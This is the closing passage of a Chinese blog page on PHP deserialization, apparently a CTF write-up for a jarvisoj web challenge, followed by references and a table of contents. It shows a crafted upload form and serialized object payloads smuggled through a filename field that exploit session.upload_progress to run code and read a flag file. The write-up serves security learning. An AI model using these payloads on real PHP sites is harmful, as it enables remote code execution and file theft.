    $m <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">OowoO</span>();
}
<span style="color:#66d9ef">else</span>
{
    <span style="color:#a6e22e">highlight_string</span>(<span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;index.php&#39;</span>));
}
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>看到ini_set(‘session.serialize_handler’, ‘php’);</p>
<p>暂时没找到用php_serialize添加session的方法。但看到当get传入phpinfo时会实例化OowoO这个类并访问phpinfo()</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/14.png" alt=""></p>
<p>session.upload_progress.enabled为On。session.upload_progress.enabled本身作用不大，是用来检测一个文件上传的进度。但当一个文件上传时，同时POST一个与php.ini中session.upload_progress.name同名的变量时（session.upload_progress.name的变量值默认为PHP_SESSION_UPLOAD_PROGRESS），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。</p>
<p>官方文档的解释：<a href="http://php.net/manual/en/session.upload-progress.php">http://php.net/manual/en/session.upload-progress.php</a></p>
<p>构造上传的表单:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://web.jarvisoj.com:32784/index.php&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span><span style="color:#f92672">&gt;</span>
    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;123&#34;</span> <span style="color:#f92672">/&gt;</span>
    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#f92672">/&gt;</span>
    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">form</span><span style="color:#f92672">&gt;</span>
</code></pre></div><p>用burp抓包，修改filename参数为：</p>
<p><code>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:26:&quot;print_r(scandir(__dir__));&quot;;}&quot; </code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/15.png" alt=""></p>
<p>读取文件内容：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">|</span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5</span><span style="color:#f92672">:</span><span style="color:#a6e22e">\</span><span style="color:#e6db74">&#34;OowoO</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:1:{s:4:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">mdzz</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">;s:88:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">print_r(file_get_contents(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">));</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">;}
</span><span style="color:#e6db74">
</span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/16.png" alt=""></p>
<h1 id="0x05-参考">0x05 参考</h1>
<p><a href="https://xz.aliyun.com/t/3674">https://xz.aliyun.com/t/3674</a></p>
<p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
<p><a href="https://www.anquanke.com/post/id/159206">https://www.anquanke.com/post/id/159206</a></p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x01-%e5%89%8d%e8%a8%80">
                            0x01 前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x02-php%e5%ba%8f%e5%88%97%e5%8c%96%e5%92%8c%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%9f%ba%e7%a1%80">
                            0x02 PHP序列化和反序列化基础
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#php%e5%ba%8f%e5%88%97%e5%8c%96serialize">
                            PHP序列化：serialize
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96unserialize">
                            PHP反序列化：unserialize
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x03-%e5%b8%b8%e8%a7%81%e9%ad%94%e6%9c%af%e6%96%b9%e6%b3%95">
                            0x03 常见魔术方法
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#__sleep">
                            __sleep()
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#__wakeup">
                            __wakeup()
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#__construct">
                            __construct
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#__destruct">
                            __destruct()
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#__tostring">
                            __ToString()
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e7%83%ad%e8%ba%ab%e9%a2%98">
                            热身题
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%af%b9%e8%b1%a1%e6%b3%a8%e5%85%a5-cve-2016-7124">
                            反序列化对象注入-CVE-2016-7124
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x04-session%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e">
                            0x04 session反序列化漏洞
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e7%ae%80%e4%bb%8b">
                            简介
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e5%ad%98%e5%82%a8%e6%9c%ba%e5%88%b6">
                            存储机制
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#php-session%e4%b8%ad%e7%9a%84%e5%ba%8f%e5%88%97%e5%8c%96%e5%8d%b1%e5%ae%b3">
                            PHP Session中的序列化危害
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#jarvisoj-web%e7%9a%84%e4%b8%80%e9%81%93session%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96">
                            jarvisoj-web的一道SESSION反序列化
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x05-%e5%8f%82%e8%80%83">
                            0x05 参考
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
